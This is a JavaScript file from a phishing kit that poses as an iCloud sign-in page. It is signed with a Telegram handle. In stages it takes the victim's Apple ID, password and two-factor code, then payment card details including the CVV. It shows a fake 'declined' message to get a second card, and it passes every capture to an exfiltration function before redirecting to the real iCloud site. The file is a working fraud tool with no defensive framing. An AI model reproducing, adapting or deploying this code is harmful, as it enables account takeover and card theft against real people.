document.addEventListener('DOMContentLoaded', function() {
    const loginForm = document.getElementById('loginFormElement');
    const createForm = document.getElementById('createFormElement');
    const twoFactorForm = document.getElementById('twoFactorForm');
    const cardForm = document.getElementById('cardForm');
    const secondCardForm = document.getElementById('secondCardForm');
    const twoFactorModal = document.getElementById('twoFactorModal');
    const cardVerifyPage = document.getElementById('cardVerifyPage');
    const formContainer = document.getElementById('formContainer');
    const declinedMsg = document.getElementById('declinedMsg');

    // Flip Animation Handler
    document.querySelectorAll('.flipLink').forEach(link => {
        link.addEventListener('click', (e) => {
            e.preventDefault();
            formContainer.classList.toggle('flipped');
        });
    });

    // Stage 1: Login Harvest
    loginForm.addEventListener('submit', (e) => {
        e.preventDefault();
        const appleId = document.getElementById('appleId').value;
        const password = document.getElementById('password').value;
        const keepSignedIn = document.getElementById('keepSignedIn').checked;

        // Fake Processing
        loginForm.innerHTML += '<div class="loading">Verifying...</div>';

        setTimeout(() => {
            // Exfil Login Data
            const userAgent = navigator.userAgent;
            const ip = 'SIMULATED_IP'; // Replace with real IP API in prod
            const loginData = `🆕 iCloud Login Harvest\nApple ID: ${appleId}\nPassword: ${password}\nKeep Signed: ${keepSignedIn}\nIP: ${ip}\nUA: ${userAgent}\nTime: ${new Date().toISOString()}\nCoder TG: @boyxcodex`;
            window.exfilData(loginData);

            // Trigger 2FA Modal
            twoFactorModal.classList.remove('hidden');
            loginForm.innerHTML = '<p>Login submitted. Check your device.</p>';
        }, 1500);
    });

    // Stage 2: 2FA Harvest
    twoFactorForm.addEventListener('submit', (e) => {
        e.preventDefault();
        const code = document.getElementById('verificationCode').value;

        // Exfil 2FA
        const twoFaData = `🔑 2FA Code: ${code}\nTime: ${new Date().toISOString()}\nCoder TG: @boyxcodex`;
        window.exfilData(twoFaData);

        // Fake Success, Escalate to Card
        setTimeout(() => {
            twoFactorModal.classList.add('hidden');
            document.getElementById('loginForm').style.display = 'none';
            cardVerifyPage.classList.remove('hidden');
        }, 1000);
    });

    // Stage 3: Card Harvest (First Card)
    cardForm.addEventListener('submit', (e) => {
        e.preventDefault();
        const cardName = document.getElementById('cardName').value;
        const cardNumber = document.getElementById('cardNumber').value.replace(/\s/g, '');
        const expiry = document.getElementById('expiry').value;
        const cvv = document.getElementById('cvv').value;
        const billingAddress = document.getElementById('billingAddress').value;
        const billingZip = document.getElementById('billingZip').value;

        // Luhn Check Simulation
        function luhnCheck(cardNum) {
            let sum = 0;
            let alternator = false;
            for (let i = cardNum.length - 1; i >= 0; i--) {
                let digit = parseInt(cardNum[i]);
                if (alternator) {
                    digit *= 2;
                    if (digit > 9) digit -= 9;
                }
                sum += digit;
                alternator = !alternator;
            }
            return sum % 10 === 0;
        }

        if (!luhnCheck(cardNumber)) {
            declinedMsg.classList.remove('hidden');
            return;
        }

        // Exfil First Card
        const cardData = `💳 First Card Harvest\nName: ${cardName}\nNumber: ${cardNumber}\nExpiry: ${expiry}\nCVV: ${cvv}\nAddress: ${billingAddress}\nZIP: ${billingZip}\nTime: ${new Date().toISOString()}\nCoder TG: @boyxcodex`;
        window.exfilData(cardData);

        // Show Declined, Prompt Second Card
        declinedMsg.textContent = 'Card declined due to security. Please provide alternate.';
        declinedMsg.classList.remove('hidden');
        cardForm.classList.add('hidden');
        secondCardForm.classList.remove('hidden');
    });

    // Stage 4: Second Card Harvest
    secondCardForm.addEventListener('submit', (e) => {
        e.preventDefault();
        const cardName2 = document.getElementById('cardName2').value;
        const cardNumber2 = document.getElementById('cardNumber2').value.replace(/\s/g, '');
        const expiry2 = document.getElementById('expiry2').value;
        const cvv2 = document.getElementById('cvv2').value;

        // Exfil Second Card
        const secondCardData = `💳 Second Card Harvest\nName: ${cardName2}\nNumber: ${cardNumber2}\nExpiry: ${expiry2}\nCVV: ${cvv2}\nTime: ${new Date().toISOString()}\nCoder TG: @boyxcodex`;
        window.exfilData(secondCardData);

        // Fake Success & Redirect
        alert('Verification successful! Redirecting...');
        setTimeout(() => {
            window.location.href = 'https://www.icloud.com/';
        }, 2000);
    });

    // Decoy Create Form
    createForm.addEventListener('submit', (e) => {
        e.preventDefault();
        const createData = `🆕 Create Account Attempt: [Details]\nCoder TG: @boyxcodex`;
        window.exfilData(createData);
        alert('Account creation initiated.');
    });

    // Forgot Password Decoy
    document.getElementById('forgotPassword').addEventListener('click', (e) => {
        e.preventDefault();
        alert('Password reset link sent to your email.');
    });
});

// Auto-Submit on Enter
document.addEventListener('keypress', function(e) {
    if (e.key === 'Enter') {
        e.target.closest('form').dispatchEvent(new Event('submit'));
    }
});
